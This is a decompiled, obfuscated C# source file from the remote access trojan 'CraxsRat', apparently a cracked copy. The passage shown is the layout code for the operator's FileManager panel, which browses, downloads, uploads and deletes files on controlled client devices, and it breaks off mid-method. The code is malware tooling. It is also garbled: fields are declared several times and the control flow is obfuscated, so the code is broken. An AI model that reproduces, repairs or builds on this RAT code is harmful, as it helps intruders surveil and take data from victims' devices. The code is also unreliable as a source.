// Decompiled with JetBrains decompiler
// Type: Craxs_Rat.FileManager
// Assembly: CraxsRat, Version=6.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 518449F5-7012-4EDA-9924-A26EC676C6A1
// Assembly location: C:\Users\HP\Downloads\CraxsRat v6.8 by TG @Hackfilter - Copy\CraxsRat VIP\CraxsRat_protected.exe

using Craxs_Rat.My;
using Craxs_Rat.sockets;
using DrakeUI.Framework;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Text;
using System.Windows.Forms;

#nullable disable
namespace Craxs_Rat
{
  [DesignerGenerated]
  public class FileManager : Form
  {
    public string \u0024VB\u0024Local_PackageName;
    public Drooper \u0024VB\u0024Me;
    private IContainer components;
    public string NewHost;
    public string NewPort;
    public string NewName;
    public List<Craxs_Rat.sockets.Client> listclients;
    public List<Craxs_Rat.sockets.Client> SelectedList;
    private IContainer components;
    public TcpClient Client;
    public Craxs_Rat.sockets.Client classClient;
    public bool status;
    public string path;
    public string Title;
    private IContainer components;
    private List<Rectangle> RectInputText0;
    private IContainer components;
    public TcpClient Client;
    public Craxs_Rat.sockets.Client classClient;
    public string DownloadsFolder;
    public string Title;
    private IContainer components;

    [DebuggerStepThrough]
    private void InitializeComponent()
    {
      this.components = (IContainer) new System.ComponentModel.Container();
      DataGridViewCellStyle gridViewCellStyle1 = new DataGridViewCellStyle();
label_1:
      int num1 = 1157136060;
      DataGridViewCellStyle gridViewCellStyle2;
      DataGridViewCellStyle gridViewCellStyle3;
      DataGridViewCellStyle gridViewCellStyle4;
      DataGridViewCellStyle gridViewCellStyle5;
      DataGridViewCellStyle gridViewCellStyle6;
      DataGridViewCellStyle gridViewCellStyle7;
      DataGridViewCellStyle gridViewCellStyle8;
      DataGridViewCellStyle gridViewCellStyle9;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (-(~num1 * 706850613 * -559593095 - (1826682099 * -1625707130 - 283728157)) ^ 1117845024)) % 490U)
        {
          case 0:
            this.clearsrchbtn.Anchor = AnchorStyles.Top | AnchorStyles.Right;
            num1 = (int) num2 * -857050788 ^ 664598243;
            continue;
          case 1:
            this.Downloadnum.Text = EXGuarder.\u0033F316800;
            num1 = (int) num2 * -1077104720 ^ 2030630025;
            continue;
          case 2:
            this.DrakeUIButtonIcon5.ForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            this.DrakeUIButtonIcon5.ForePressColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            this.DrakeUIButtonIcon5.Location = new Point(48, 10);
            this.DrakeUIButtonIcon5.Name = EXGuarder.\u003165C5A6A;
            num1 = (int) num2 * -5885197 ^ 70766541;
            continue;
          case 3:
            this.DrakeUIButtonIcon5.RectPressColor = Color.Transparent;
            this.DrakeUIButtonIcon5.RectSelectedColor = Color.Transparent;
            num1 = (int) num2 * 1250310442 ^ 413216045;
            continue;
          case 4:
            this.DrakeUIButtonIcon8.Size = new Size(58, 41);
            num1 = (int) num2 * 531680799 ^ -559286796;
            continue;
          case 5:
            this.DGV0.AutoSizeColumnsMode = DataGridViewAutoSizeColumnsMode.Fill;
            this.DGV0.AutoSizeRowsMode = DataGridViewAutoSizeRowsMode.AllCells;
            num1 = (int) num2 * 1262003731 ^ 252877005;
            continue;
          case 6:
            this.DrakeUIButtonIcon6.RectPressColor = Color.Transparent;
            num1 = (int) num2 * -1547548265 ^ -1534102981;
            continue;
          case 7:
            this.DGVDATA.BackgroundColor = Color.FromArgb(35, 35, 35);
            this.DGVDATA.BorderStyle = BorderStyle.None;
            num1 = (int) num2 * -557379595 ^ 1224384456;
            continue;
          case 8:
            this.cancelbtn.FillHoverColor = Color.FromArgb(20, 20, 20);
            this.cancelbtn.FillPressColor = Color.Black;
            num1 = (int) num2 * -165825588 ^ -2127459116;
            continue;
          case 9:
            this.PB = new ProgressBar();
            num1 = (int) num2 * 1610609202 ^ -1463010920;
            continue;
          case 10:
            this.ctxMenu.Name = EXGuarder.\u003422A4901;
            this.ctxMenu.Size = new Size(170, 460);
            num1 = (int) num2 * -1926773027 ^ 1312876358;
            continue;
          case 11:
            this.DGV0.Columns.AddRange((DataGridViewColumn) this.typ, (DataGridViewColumn) this.nam, (DataGridViewColumn) this.siz, (DataGridViewColumn) this.mofdat, (DataGridViewColumn) this.dat, (DataGridViewColumn) this.ic);
            num1 = (int) num2 * -443442704 ^ -1226269462;
            continue;
          case 12:
            this.Downpic.FillPressColor = Color.Black;
            num1 = (int) num2 * 1690477494 ^ 741632456;
            continue;
          case 13:
            this.DrakeUIButtonIcon5.Symbol = 61473;
            this.DrakeUIButtonIcon5.TabIndex = 28;
            num1 = (int) num2 * -673457023 ^ 49142709;
            continue;
          case 14:
            this.picbtn.RectColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            this.picbtn.RectDisableColor = Color.FromArgb(227, 242, 253);
            this.picbtn.RectHoverColor = Color.White;
            this.picbtn.RectPressColor = Color.White;
            this.picbtn.RectSelectedColor = Color.White;
            this.picbtn.Size = new Size(163, 26);
            num1 = (int) num2 * -1414216860 ^ 1086081047;
            continue;
          case 15:
            this.DGV0.Name = EXGuarder.\u00357503A49;
            num1 = (int) num2 * -1163056146 ^ 927486499;
            continue;
          case 16:
            this.Downpic.Size = new Size(163, 26);
            this.Downpic.Style = UIStyle.Custom;
            this.Downpic.Symbol = 61639;
            num1 = (int) num2 * -448421225 ^ 287017884;
            continue;
          case 17:
            ((ISupportInitialize) this.ClientPic).BeginInit();
            this.Panel4.SuspendLayout();
            num1 = (int) num2 * -1211624671 ^ -725917232;
            continue;
          case 18:
            this.OpenToolStripMenuItem.Size = new Size(169, 24);
            this.OpenToolStripMenuItem.Text = EXGuarder.\u0034F5C554F;
            this.CopyToolStripMenuItem.Name = EXGuarder.\u00353733519;
            this.CopyToolStripMenuItem.ShortcutKeys = Keys.C | Keys.Control;
            this.CopyToolStripMenuItem.Size = new Size(169, 24);
            num1 = (int) num2 * -1675490067 ^ 279837592;
            continue;
          case 19:
            this.TOpacity = new Timer(this.components);
            num1 = (int) num2 * -1925999426 ^ 1053877733;
            continue;
          case 20:
            this.siz.FillWeight = 45f;
            num1 = (int) num2 * 1362101141 ^ 2069234049;
            continue;
          case 21:
            this.ClientPic.TabIndex = 10;
            num1 = (int) num2 * -303749382 ^ 1901875567;
            continue;
          case 22:
            this.typ.ReadOnly = true;
            num1 = (int) num2 * 1733649287 ^ 848702689;
            continue;
          case 23:
            this.DrakeUIButtonIcon7.Cursor = Cursors.Hand;
            num1 = (int) num2 * -746389502 ^ 500693779;
            continue;
          case 24:
            this.DrakeWidth_W4.Location = new Point(39, 403);
            this.DrakeWidth_W4.Name = EXGuarder.\u00311123013;
            num1 = (int) num2 * 592587369 ^ 1967957010;
            continue;
          case 25:
            this.N.HeaderText = EXGuarder.\u0033101340F;
            this.N.Name = EXGuarder.\u0036F002920;
            this.P.HeaderText = EXGuarder.\u00326796C44;
            this.P.Name = EXGuarder.\u003234C4A76;
            num1 = (int) num2 * -1195131583 ^ 241831633;
            continue;
          case 26:
            this.DGVDATA.AllowUserToResizeRows = false;
            gridViewCellStyle5.Alignment = DataGridViewContentAlignment.MiddleLeft;
            gridViewCellStyle5.BackColor = Color.FromArgb(35, 35, 35);
            gridViewCellStyle5.ForeColor = Color.White;
            num1 = (int) num2 * -1752306221 ^ 1740329247;
            continue;
          case 27:
            this.clinumb.Name = EXGuarder.\u0035F074E4E;
            this.clinumb.Size = new Size(11, 17);
            this.clinumb.TabIndex = 19;
            this.clinumb.Text = EXGuarder.\u0030F176D04;
            this.Timer1.Interval = 2500;
            num1 = (int) num2 * -1285978218 ^ -1487440637;
            continue;
          case 28:
            this.DecodeToolStripMenuItem.Size = new Size(169, 24);
            num1 = (int) num2 * -1809434525 ^ 1545401893;
            continue;
          case 29:
            this.Panel4.Controls.Add((Control) this.DrakeUIButtonIcon6);
            num1 = (int) num2 * 985029154 ^ -1044657283;
            continue;
          case 30:
            this.SuspendLayout();
            num1 = (int) num2 * -1124080091 ^ 1237972828;
            continue;
          case 31:
            this.DrakeUIButtonIcon7.RectDisableColor = Color.Transparent;
            num1 = (int) num2 * -276730815 ^ 909050759;
            continue;
          case 32:
            this.sdbtn.Font = new Font(EXGuarder.\u0036F401941, 12f);
            num1 = (int) num2 * -181511776 ^ 1533891550;
            continue;
          case 33:
            this.clearsrchbtn.Symbol = 77;
            this.clearsrchbtn.SymbolSize = 30;
            num1 = (int) num2 * -128238475 ^ 114032416;
            continue;
          case 34:
            this.UploadToolStripMenuItem.Size = new Size(169, 24);
            this.UploadToolStripMenuItem.Text = EXGuarder.\u0032C520430;
            num1 = (int) num2 * 1110717840 ^ 199622862;
            continue;
          case 35:
            this.seentext = new Label();
            this.Selecttext = new Label();
            num1 = (int) num2 * 29958879 ^ 202131030;
            continue;
          case 36:
            this.searchbtn = new DrakeUIAvatar();
            this.DrakeUIButtonIcon5 = new DrakeUIButtonIcon();
            this.DrakeUIButtonIcon4 = new DrakeUIButtonIcon();
            this.DrakeWidth_W1 = new DrakeWidth_W();
            num1 = (int) num2 * -1792456382 ^ -611352533;
            continue;
          case 37:
            this.Panel2.Controls.Add((Control) this.DrakeWidth_W1);
            num1 = (int) num2 * 611055128 ^ -1141693324;
            continue;
          case 38:
            this.Label1.Text = EXGuarder.\u0033A27623B;
            this.Label1.TextAlign = ContentAlignment.MiddleLeft;
            this.seentext.Dock = DockStyle.Left;
            this.seentext.FlatStyle = FlatStyle.System;
            num1 = (int) num2 * -1502210832 ^ 1486942811;
            continue;
          case 39:
            this.DrakeWidth_W3.Size = new Size(100, 1);
            num1 = (int) num2 * 599094187 ^ -1491916593;
            continue;
          case 40:
            this.DecodeToolStripMenuItem = new ToolStripMenuItem();
            this.ZipToolStripMenuItem = new ToolStripMenuItem();
            num1 = (int) num2 * 1869838942 ^ -1592943093;
            continue;
          case 41:
            this.DGV0.ColumnHeadersHeightSizeMode = DataGridViewColumnHeadersHeightSizeMode.DisableResizing;
            num1 = (int) num2 * 1804430345 ^ 1368535478;
            continue;
          case 42:
            this.DrakeUIButtonIcon7.Location = new Point(58, 0);
            num1 = (int) num2 * -604550547 ^ -1922759819;
            continue;
          case 43:
            this.nam.FillWeight = 70f;
            num1 = (int) num2 * 2101604356 ^ -336353522;
            continue;
          case 44:
            this.Label2.Location = new Point(3, 9);
            this.Label2.Name = EXGuarder.\u0034A3F6465;
            num1 = (int) num2 * 2125465742 ^ -1831058039;
            continue;
          case 45:
            this.DrakeUIButtonIcon5.Font = new Font(EXGuarder.\u0036F401941, 12f);
            num1 = (int) num2 * -178634942 ^ -658212852;
            continue;
          case 46:
            gridViewCellStyle3.SelectionBackColor = Color.FromArgb(35, 35, 35);
            num1 = (int) num2 * 195583664 ^ -1651094513;
            continue;
          case 47:
            gridViewCellStyle8.Font = new Font(EXGuarder.\u0036F401941, 12f);
            num1 = (int) num2 * -28896148 ^ -1634112846;
            continue;
          case 48:
            this.dat.Name = EXGuarder.\u00369437879;
            this.dat.ReadOnly = true;
            num1 = (int) num2 * 1035200584 ^ 1150655114;
            continue;
          case 49:
            this.picbtn.Symbol = 62142;
            this.picbtn.TabIndex = 26;
            num1 = (int) num2 * 1646268857 ^ 2047005480;
            continue;
          case 50:
            this.Usrbtry.TabStop = false;
            this.sdbtn.Cursor = Cursors.Hand;
            num1 = (int) num2 * -1231672466 ^ 644612587;
            continue;
          case 51:
            this.DrakeUIButtonIcon8.Dock = DockStyle.Left;
            num1 = (int) num2 * -785737799 ^ 1006749640;
            continue;
          case 52:
            this.Downpic.Radius = 25;
            this.Downpic.RectColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num2 * -2111389232 ^ 1883983483;
            continue;
          case 53:
            this.picbtn.Style = UIStyle.Custom;
            num1 = (int) num2 * -162104770 ^ -307520089;
            continue;
          case 54:
            this.ctxMenu.ImageScalingSize = new Size(20, 20);
            num1 = (int) num2 * -1311101416 ^ -580523540;
            continue;
          case 55:
            this.Controls.Add((Control) this.Panel3);
            num1 = (int) num2 * -770980222 ^ 1382919074;
            continue;
          case 56:
            this.picbtn.ForePressColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            this.picbtn.Location = new Point(9, 125);
            num1 = (int) num2 * 2078749525 ^ -2092348083;
            continue;
          case 57:
            this.TOpacity.Interval = 1;
            this.ThumbsCont.AutoSize = true;
            num1 = (int) num2 * 1345950543 ^ -2132185839;
            continue;
          case 58:
            this.Label1.Name = EXGuarder.\u00375430158;
            this.Label1.Size = new Size(144, 25);
            num1 = (int) num2 * 1480918616 ^ 985985850;
            continue;
          case 59:
            this.Panel3.SuspendLayout();
            num1 = (int) num2 * 193318017 ^ 465965673;
            continue;
          case 60:
            this.DGV0.AllowUserToDeleteRows = false;
            num1 = (int) num2 * 1062811333 ^ 613523838;
            continue;
          case 61:
            this.Panel3.Controls.Add((Control) this.sdbtn);
            this.Panel3.Controls.Add((Control) this.dcmbtn);
            num1 = (int) num2 * 1147722517 ^ 344383252;
            continue;
          case 62:
            this.Downloadnum.AutoSize = true;
            num1 = (int) num2 * 1259116945 ^ 103055706;
            continue;
          case 63:
            this.searchbtn.TabIndex = 35;
            this.DrakeUIButtonIcon5.Cursor = Cursors.Hand;
            num1 = (int) num2 * 2083723852 ^ 97587337;
            continue;
          case 64:
            gridViewCellStyle8 = new DataGridViewCellStyle();
            num1 = (int) num2 * -116863879 ^ -131854902;
            continue;
          case 65:
            this.Panel6.Size = new Size(837, 25);
            num1 = (int) num2 * -753528820 ^ 577476957;
            continue;
          case 66:
            this.viwimage.BackColor = Color.Black;
            num1 = (int) num2 * 801893712 ^ -902384840;
            continue;
          case 67:
            this.ClientPic.TabStop = false;
            this.picbtn.Cursor = Cursors.Hand;
            this.picbtn.FillColor = Color.Black;
            num1 = (int) num2 * -1552054993 ^ 626008288;
            continue;
          case 68:
            gridViewCellStyle5 = new DataGridViewCellStyle();
            num1 = (int) num2 * -611982964 ^ 919754927;
            continue;
          case 69:
            this.UnZipToolStripMenuItem = new ToolStripMenuItem();
            this.DeleteToolStripMenuItem = new ToolStripMenuItem();
            num1 = (int) num2 * -290140633 ^ 729509943;
            continue;
          case 70:
            this.Selecttext.ForeColor = Color.Lime;
            this.Selecttext.Location = new Point(141, 0);
            this.Selecttext.Name = EXGuarder.\u00358472107;
            num1 = (int) num2 * -262112286 ^ 1430734412;
            continue;
          case 71:
            gridViewCellStyle6.SelectionBackColor = Color.White;
            gridViewCellStyle6.SelectionForeColor = Color.FromArgb(48, 48, 48);
            gridViewCellStyle6.WrapMode = DataGridViewTriState.False;
            num1 = (int) num2 * -1732218652 ^ -574662092;
            continue;
          case 72:
            this.ClearButton.Size = new Size(163, 26);
            num1 = (int) num2 * 1562483366 ^ -316499318;
            continue;
          case 73:
            this.sdbtn.Symbol = 61563;
            num1 = (int) num2 * 1882745307 ^ 1442400495;
            continue;
          case 74:
            gridViewCellStyle8.SelectionForeColor = SystemColors.HighlightText;
            gridViewCellStyle8.WrapMode = DataGridViewTriState.True;
            this.DGV0.ColumnHeadersDefaultCellStyle = gridViewCellStyle8;
            num1 = (int) num2 * -957375480 ^ -2058761497;
            continue;
          case 75:
            this.Panel2.Location = new Point(179, 0);
            num1 = (int) num2 * -512289931 ^ -1794252934;
            continue;
          case 76:
            this.sdbtn.Location = new Point(11, 61);
            num1 = (int) num2 * 601617083 ^ 151433402;
            continue;
          case 77:
            this.clearsrchbtn = new DrakeUIAvatar();
            this.searchtext = new DrakeUITextBox();
            num1 = (int) num2 * -812189370 ^ -986978142;
            continue;
          case 78:
            this.dcmbtn.RectSelectedColor = Color.White;
            num1 = (int) num2 * 229296552 ^ 2111375616;
            continue;
          case 79:
            this.UnZipToolStripMenuItem.Text = EXGuarder.\u0035D620706;
            num1 = (int) num2 * -1026690528 ^ -1636572749;
            continue;
          case 80:
            this.DGV0.Size = new Size(837, 774);
            this.DGV0.StripeEvenColor = Color.Black;
            num1 = (int) num2 * -1879313416 ^ -1413790698;
            continue;
          case 81:
            this.seentext.Font = new Font(EXGuarder.\u0036F401941, 8.25f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
            num1 = (int) num2 * 1083307738 ^ 1363305273;
            continue;
          case 82:
            this.DrakeUIButtonIcon8.Location = new Point(0, 0);
            this.DrakeUIButtonIcon8.Name = EXGuarder.\u0034F060907;
            this.DrakeUIButtonIcon8.Radius = 0;
            this.DrakeUIButtonIcon8.RectColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num2 * -1275571486 ^ 1940953876;
            continue;
          case 83:
            this.Panel4.Name = EXGuarder.\u003253E573E;
            num1 = (int) num2 * -1207886629 ^ -750619066;
            continue;
          case 84:
            this.pathtxt.ForeColor = Color.Black;
            num1 = (int) num2 * 1975474242 ^ -875094667;
            continue;
          case 85:
            this.ClearButton = new DrakeUIButtonIcon();
            num1 = (int) num2 * -1045929296 ^ 914384060;
            continue;
          case 86:
            this.ClientPic.SizeMode = PictureBoxSizeMode.Zoom;
            num1 = (int) num2 * -858090806 ^ 263813859;
            continue;
          case 87:
            this.DGVDATA.AllowUserToAddRows = false;
            this.DGVDATA.AllowUserToDeleteRows = false;
            this.DGVDATA.AllowUserToResizeColumns = false;
            num1 = (int) num2 * 1227344156 ^ -454373580;
            continue;
          case 88:
            this.thumb_chk.Checked = true;
            this.thumb_chk.Cursor = Cursors.Hand;
            num1 = (int) num2 * -244067586 ^ 1395267236;
            continue;
          case 89:
            this.DownloadToolStripMenuItem.Size = new Size(169, 24);
            num1 = (int) num2 * 323896573 ^ -1089320976;
            continue;
          case 90:
            this.DrakeUIButtonIcon5.Style = UIStyle.Custom;
            num1 = (int) num2 * -1616029531 ^ -125610711;
            continue;
          case 91:
            this.Downloadnum.TabIndex = 37;
            num1 = (int) num2 * 613516536 ^ 1412381815;
            continue;
          case 92:
            gridViewCellStyle8.ForeColor = Color.White;
            num1 = (int) num2 * -167974287 ^ -291884839;
            continue;
          case 93:
            this.RenameToolStripMenuItem = new ToolStripMenuItem();
            num1 = (int) num2 * -375435269 ^ -1666991531;
            continue;
          case 94:
            gridViewCellStyle9.SelectionForeColor = Color.White;
            num1 = (int) num2 * 766754468 ^ 277747211;
            continue;
          case 95:
            this.DeleteToolStripMenuItem.Name = EXGuarder.\u0032154322B;
            num1 = (int) num2 * -985759684 ^ -494947835;
            continue;
          case 96:
            this.cancelbtn = new DrakeUIButtonIcon();
            num1 = (int) num2 * 157539236 ^ -867343690;
            continue;
          case 97:
            this.DecodeToolStripMenuItem.Text = EXGuarder.\u0036C671E22;
            this.ZipToolStripMenuItem.Name = EXGuarder.\u0036F330E5B;
            num1 = (int) num2 * -1667393455 ^ 652170005;
            continue;
          case 98:
            this.Downpic.FillSelectedColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num2 * 1920581244 ^ -1926940624;
            continue;
          case 99:
            this.DrakeUIButtonIcon6 = new DrakeUIButtonIcon();
            this.clinumb = new Label();
            this.Timer1 = new Timer(this.components);
            this.Label2 = new Label();
            num1 = (int) num2 * -1400186967 ^ -1761819617;
            continue;
          case 100:
            this.DGV0.StripeOddColor = Color.Black;
            this.DGV0.Style = UIStyle.Custom;
            this.DGV0.StyleCustomMode = true;
            this.DGV0.TabIndex = 14;
            num1 = (int) num2 * 1942782159 ^ 299595478;
            continue;
          case 101:
            this.DrakeUIButtonIcon7 = new DrakeUIButtonIcon();
            this.DrakeUIButtonIcon8 = new DrakeUIButtonIcon();
            num1 = (int) num2 * -1859520793 ^ 1441124168;
            continue;
          case 102:
            this.DGVDATA = new DataGridView();
            num1 = (int) num2 * -476886974 ^ 1763135175;
            continue;
          case 103:
            gridViewCellStyle3.ForeColor = Color.White;
            num1 = (int) num2 * 1619631526 ^ 1486166530;
            continue;
          case 104:
            this.CopyToolStripMenuItem.Text = EXGuarder.\u0034C184160;
            num1 = (int) num2 * 640683888 ^ -1248958693;
            continue;
          case 105:
            this.viwimage.Name = EXGuarder.\u0031748003A;
            this.viwimage.Size = new Size(179, 379);
            this.viwimage.SizeMode = PictureBoxSizeMode.Zoom;
            this.viwimage.TabIndex = 19;
            num1 = (int) num2 * -1179085320 ^ 488368280;
            continue;
          case 106:
            this.DrakeUIButtonIcon8.SymbolSize = 29;
            num1 = (int) num2 * 144970040 ^ 2034163740;
            continue;
          case 107:
            this.Panel2.TabIndex = 8;
            num1 = (int) num2 * -1054805746 ^ 1512977162;
            continue;
          case 108:
            this.Panel3.Controls.Add((Control) this.DrakeWidth_W4);
            num1 = (int) num2 * 1066844525 ^ -1644313967;
            continue;
          case 109:
            this.DGV0.RowsDefaultCellStyle = gridViewCellStyle4;
            this.DGV0.RowTemplate.Height = 29;
            num1 = (int) num2 * -2110769890 ^ 238836924;
            continue;
          case 110:
            this.DrakeUIButtonIcon4.Symbol = 61608;
            num1 = (int) num2 * 1739809780 ^ 53804871;
            continue;
          case 111:
            this.Panel3 = new Panel();
            this.Downloadnum = new Label();
            num1 = (int) num2 * 1927849474 ^ -1429831086;
            continue;
          case 112:
            this.D = new DataGridViewTextBoxColumn();
            this.ST = new DataGridViewTextBoxColumn();
            num1 = (int) num2 * 381192080 ^ -1430008336;
            continue;
          case 113:
            this.searchtext.Cursor = Cursors.IBeam;
            num1 = (int) num2 * -736713941 ^ -473009721;
            continue;
          case 114:
            this.Label1.Location = new Point(693, 0);
            num1 = (int) num2 * 713429626 ^ 1059938044;
            continue;
          case 115:
            this.DGVDATA.ColumnHeadersBorderStyle = DataGridViewHeaderBorderStyle.None;
            num1 = (int) num2 * 387780331 ^ 906920087;
            continue;
          case 116:
            this.mofdat.HeaderText = EXGuarder.\u0031F207309;
            num1 = (int) num2 * -616455226 ^ 1430569027;
            continue;
          case 117:
            this.Label2.TabIndex = 9;
            this.Panel2.BackColor = Color.Black;
            num1 = (int) num2 * -330553793 ^ -1354037183;
            continue;
          case 118:
            this.DrakeUIButtonIcon7.Font = new Font(EXGuarder.\u0036F401941, 12f);
            this.DrakeUIButtonIcon7.ForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num2 * -1590293247 ^ 811287433;
            continue;
          case 119:
            this.DGVDATA.Location = new Point(0, 0);
            num1 = (int) num2 * 1725682823 ^ 763170701;
            continue;
          case 120:
            this.sdbtn.TabIndex = 24;
            this.sdbtn.Text = EXGuarder.\u0035B071463;
            num1 = (int) num2 * -2075647266 ^ 1264903573;
            continue;
          case 121:
            this.DrakeUIButtonIcon7.TabIndex = 29;
            num1 = (int) num2 * 1904777653 ^ -1244232583;
            continue;
          case 122:
            this.DrakeUIButtonIcon8.TabIndex = 30;
            num1 = (int) num2 * -1494106836 ^ 1415247604;
            continue;
          case 123:
            this.searchtext.Location = new Point(570, 10);
            num1 = (int) num2 * -406360233 ^ 2113608090;
            continue;
          case 124:
            gridViewCellStyle2.SelectionBackColor = Color.FromArgb(35, 35, 35);
            num1 = (int) num2 * 1674959794 ^ -1545201678;
            continue;
          case 125:
            this.searchtext.StyleCustomMode = true;
            this.searchtext.TabIndex = 34;
            this.searchtext.Watermark = EXGuarder.\u0032819524C;
            num1 = (int) num2 * 1500373663 ^ -151789398;
            continue;
          case 126:
            this.ic.FillWeight = 45f;
            this.ic.HeaderText = EXGuarder.\u00326365908;
            this.ic.Name = EXGuarder.\u0032B424866;
            this.ic.ReadOnly = true;
            num1 = (int) num2 * 128954585 ^ 1039291247;
            continue;
          case (uint) sbyte.MaxValue:
            this.ThumbsCont = new Label();
            num1 = (int) num2 * -932717768 ^ -476109545;
            continue;
          case 128:
            this.pathtxt.Style = UIStyle.Custom;
            num1 = (int) num2 * 2036805576 ^ 854669765;
            continue;
          case 129:
            this.typ.HeaderText = EXGuarder.\u00332267526;
            num1 = (int) num2 * 912502055 ^ -1931825704;
            continue;
          case 130:
            this.seentext.Name = EXGuarder.\u00360590569;
            this.seentext.Size = new Size(155, 25);
            this.seentext.TabIndex = 2;
            num1 = (int) num2 * 434441201 ^ -12099693;
            continue;
          case 131:
            this.clearsrchbtn.AvatarSize = 25;
            this.clearsrchbtn.Cursor = Cursors.Hand;
            num1 = (int) num2 * 108308802 ^ 61175218;
            continue;
          case 132:
            this.DrakeUIButtonIcon6.FillHoverColor = Color.FromArgb(20, 20, 20);
            this.DrakeUIButtonIcon6.FillPressColor = Color.Black;
            this.DrakeUIButtonIcon6.FillSelectedColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num2 * 604497858 ^ 1478080031;
            continue;
          case 133:
            this.sdbtn = new DrakeUIButtonIcon();
            num1 = (int) num2 * -1264157693 ^ -867630258;
            continue;
          case 134:
            this.DrakeUIButtonIcon6.Cursor = Cursors.Hand;
            num1 = (int) num2 * 1197531977 ^ 398123713;
            continue;
          case 135:
            this.Panel3.Controls.Add((Control) this.Panel4);
            this.Panel3.Controls.Add((Control) this.ThumbsCont);
            this.Panel3.Dock = DockStyle.Left;
            this.Panel3.Location = new Point(0, 0);
            this.Panel3.Name = EXGuarder.\u00362401B3D;
            this.Panel3.Size = new Size(179, 850);
            this.Panel3.TabIndex = 20;
            num1 = (int) num2 * -1315481046 ^ 1448062774;
            continue;
          case 136:
            this.DGVDATA.AlternatingRowsDefaultCellStyle = gridViewCellStyle5;
            num1 = (int) num2 * -1646041751 ^ 1278902877;
            continue;
          case 137:
            this.viwimage = new PictureBox();
            num1 = (int) num2 * 181611645 ^ -503467504;
            continue;
          case 138:
            this.Panel2.Controls.Add((Control) this.PB);
            num1 = (int) num2 * -505573226 ^ -229908036;
            continue;
          case 139:
            this.DrakeUIButtonIcon4.TabIndex = 27;
            this.DrakeWidth_W1.BackColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num2 * -1124380602 ^ -1636519117;
            continue;
          case 140:
            gridViewCellStyle7.BackColor = Color.FromArgb(35, 35, 35);
            gridViewCellStyle7.Font = new Font(EXGuarder.\u0036F401941, 8.25f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
            num1 = (int) num2 * 334570156 ^ 1339356813;
            continue;
          case 141:
            this.searchbtn.Location = new Point(798, 9);
            num1 = (int) num2 * -236517735 ^ -919902452;
            continue;
          case 142:
            this.DGVDATA.EnableHeadersVisualStyles = false;
            this.DGVDATA.GridColor = Color.White;
            num1 = (int) num2 * -1342836429 ^ 1527560379;
            continue;
          case 143:
            this.ShowToolStripMenuItem.Text = EXGuarder.\u003466E094E;
            num1 = (int) num2 * -169657266 ^ -699972986;
            continue;
          case 144:
            this.ClearButton.RectHoverColor = Color.White;
            num1 = (int) num2 * 661765647 ^ 1820479756;
            continue;
          case 145:
            this.DrakeUIButtonIcon6.Radius = 0;
            this.DrakeUIButtonIcon6.RectColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num2 * -1524425692 ^ -546311283;
            continue;
          case 146:
            this.searchbtn.AvatarSize = 25;
            this.searchbtn.Cursor = Cursors.Hand;
            num1 = (int) num2 * 1012857444 ^ 245310062;
            continue;
          case 147:
            this.usrscreen.TabStop = false;
            this.Usrbtry.Location = new Point(75, 8);
            this.Usrbtry.Margin = new Padding(3, 4, 3, 4);
            num1 = (int) num2 * -402039642 ^ 839198923;
            continue;
          case 148:
            gridViewCellStyle5.SelectionForeColor = Color.White;
            num1 = (int) num2 * -90898758 ^ 1734097788;
            continue;
          case 149:
            this.Panel3.Controls.Add((Control) this.viwimage);
            this.Panel3.Controls.Add((Control) this.usrscreen);
            this.Panel3.Controls.Add((Control) this.Usrbtry);
            num1 = (int) num2 * 1832126947 ^ 1998237260;
            continue;
          case 150:
            this.pathtxt.Anchor = AnchorStyles.Top | AnchorStyles.Left | AnchorStyles.Right;
            num1 = (int) num2 * -1941579802 ^ -1147744740;
            continue;
          case 151:
            this.DrakeUIButtonIcon5.RectColor = Color.Transparent;
            num1 = (int) num2 * -824913829 ^ 1083064308;
            continue;
          case 152:
            this.DownloadToolStripMenuItem.Name = EXGuarder.\u00320763612;
            num1 = (int) num2 * 2002934685 ^ -837903885;
            continue;
          case 153:
            this.DrakeUIButtonIcon5.FillColor = Color.Black;
            this.DrakeUIButtonIcon5.FillHoverColor = Color.FromArgb(20, 20, 20);
            num1 = (int) num2 * 1212354785 ^ 1178181530;
            continue;
          case 154:
            this.usrscreen.Name = EXGuarder.\u0034C68523D;
            num1 = (int) num2 * -1028374380 ^ -1761059953;
            continue;
          case 155:
            this.DrakeUIButtonIcon4.Style = UIStyle.Custom;
            num1 = (int) num2 * -893810857 ^ -703803013;
            continue;
          case 156:
            this.viwimage.TabStop = false;
            this.viwimage.Visible = false;
            this.usrscreen.Location = new Point(114, 8);
            this.usrscreen.Margin = new Padding(3, 4, 3, 4);
            num1 = (int) num2 * 994886346 ^ -1996666156;
            continue;
          case 158:
            this.ClearButton.Location = new Point(10, 360);
            num1 = (int) num2 * -191656678 ^ 1170139728;
            continue;
          case 159:
            this.FolderDownloadsToolStripMenuItem.Name = EXGuarder.\u0033F121D4B;
            num1 = (int) num2 * 1967210408 ^ -1975994329;
            continue;
          case 160:
            this.clinumb.ForeColor = Color.Lime;
            this.clinumb.Location = new Point(11, 52);
            num1 = (int) num2 * -390439624 ^ 1596501101;
            continue;
          case 161:
            this.picbtn.Text = EXGuarder.\u003486A740C;
            this.Panel4.Controls.Add((Control) this.DrakeUIButtonIcon7);
            this.Panel4.Controls.Add((Control) this.DrakeUIButtonIcon8);
            num1 = (int) num2 * -1356151330 ^ -72390543;
            continue;
          case 162:
